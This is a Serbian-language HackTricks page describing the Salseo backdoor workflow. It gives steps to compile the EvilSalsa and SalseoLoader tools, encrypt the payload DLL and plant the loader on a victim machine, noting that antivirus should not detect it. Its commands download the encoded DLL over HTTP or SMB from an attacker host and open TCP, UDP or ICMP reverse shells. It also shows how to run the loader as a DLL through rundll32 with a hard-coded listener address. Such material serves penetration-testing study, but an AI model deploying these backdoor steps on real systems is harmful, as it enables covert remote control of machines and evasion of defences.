# Salseo

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Kompajliranje binarnih fajlova

Preuzmite izvorni kod sa github-a i kompajlirajte **EvilSalsa** i **SalseoLoader**. Trebaće vam **Visual Studio** instaliran da biste kompajlirali kod.

Kompajlirajte ove projekte za arhitekturu Windows sistema na kojem ćete ih koristiti (ako Windows podržava x64, kompajlirajte ih za tu arhitekturu).

Možete **izabrati arhitekturu** unutar Visual Studio u **levom "Build" Tab-u** u **"Platform Target".**

(\*\*Ako ne možete pronaći ove opcije, pritisnite na **"Project Tab"** a zatim na **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Zatim, izgradite oba projekta (Build -> Build Solution) (Unutar logova će se pojaviti putanja izvršnog fajla):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Priprema zadnjih vrata

Prvo, trebaće vam da enkodujete **EvilSalsa.dll.** Da biste to uradili, možete koristiti python skriptu **encrypterassembly.py** ili možete kompajlirati projekat **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Sada imate sve što vam je potrebno da izvršite ceo Salseo postupak: **enkodirani EvilDalsa.dll** i **binarni fajl SalseoLoader.**

**Otpremite binarni fajl SalseoLoader.exe na mašinu. Ne bi trebalo da budu otkriveni od strane bilo kog AV...**

## **Izvršite backdoor**

### **Dobijanje TCP reverznog shell-a (preuzimanje enkodiranog dll-a putem HTTP-a)**

Zapamtite da pokrenete nc kao osluškivač reverznog shella i HTTP server kako biste poslužili enkodirani evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Dobijanje UDP reverse shell-a (preuzimanje enkodovanog dll-a preko SMB-a)**

Zapamtite da pokrenete nc kao osluškivač reverse shell-a, i SMB server da posluži enkodovani evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Dobijanje ICMP reverznog šela (enkodirani dll već unutar žrtve)**

**Ovog puta vam je potreban poseban alat na klijentu da primi reverzni šel. Preuzmite:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Onemogućavanje ICMP odgovora:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Izvršite klijenta:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Unutar žrtve, izvršimo salseo stvar:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompajliranje SalseoLoader-a kao DLL izvođenjem glavne funkcije

Otvorite projekat SalseoLoader koristeći Visual Studio.

### Dodajte pre glavne funkcije: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instalirajte DllExport za ovaj projekat

#### **Alati** --> **NuGet Package Manager** --> **Upravljanje NuGet paketima za rešenje...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Pretražite DllExport paket (koristeći karticu Pretraži) i pritisnite Instaliraj (i prihvatite iskačući prozor)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

U vašem projekt folderu pojaviće se fajlovi: **DllExport.bat** i **DllExport\_Configure.bat**

### **De**instalirajte DllExport

Pritisnite **Deinstaliraj** (da, čudno je, ali verujte mi, neophodno je)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Izađite iz Visual Studio-a i izvršite DllExport\_configure**

Jednostavno **izađite** iz Visual Studio-a

Zatim, idite u vaš **SalseoLoader folder** i **izvršite DllExport\_Configure.bat**

Izaberite **x64** (ako ćete ga koristiti unutar x64 okruženja, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Otvorite projekat ponovo sa Visual Studio-om**

**\[DllExport]** više ne bi trebalo da bude označen kao greška

![](<../.gitbook/assets/image (8) (1).png>)

### Izgradite rešenje

Izaberite **Tip izlaza = Biblioteka klasa** (Projekat --> SalseoLoader Properties --> Application --> Tip izlaza = Biblioteka klasa)

![](<../.gitbook/assets/image (10) (1).png>)

Izaberite **x64 platformu** (Projekat --> SalseoLoader Properties --> Build --> Ciljna platforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Da biste **izgradili** rešenje: Build --> Izgradi rešenje (Unutar konzole za izlaz pojaviće se putanja nove DLL datoteke)

### Testirajte generisanu Dll

Kopirajte i nalepite Dll gde želite da je testirate.

Izvršite:
```
rundll32.exe SalseoLoader.dll,main
```
Ako se ne pojavi greška, verovatno imate funkcionalnu DLL!!

## Dobijanje shell-a korišćenjem DLL-a

Ne zaboravite da koristite **HTTP** **server** i postavite **nc** **listener**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Učite i vežbajte hakovanje AWS-a: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
